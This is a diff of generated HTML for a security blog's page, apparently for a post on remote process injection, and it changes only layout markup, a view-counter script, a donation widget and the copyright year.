+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
     </div>
-    <script>
-      var oid = "views_posts\/remote-process-injection\/_index.md"
-      var oid_likes = "likes_posts\/remote-process-injection\/_index.md"
-    </script>
-    
-    
-    <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
-  </section>
-  
-  <section class="mt-10 prose dark:prose-invert">
-    <p class="py-8 border-t">
-      <em>There's no articles to list here yet.</em>
-    </p>
-  </section>
   
 
-    
 
-  
+    
+  </footer>
+</article>
+
       <div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
   <a href="#the-top"
     class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
@@ -1106,7 +1289,7 @@
     
     <p class="text-sm text-neutral-500 dark:text-neutral-400">
       &copy;
-      2023
+      2024
       BinaryChunk
     </p>
     
@@ -1192,9 +1375,5 @@
 
   </div>
 </body>
-
-<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js"
-  data-id="https://buymeacoffee.com/binarychunk" data-description="Support me on Buy me a coffee!" data-message=""
-  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
 
 </html>
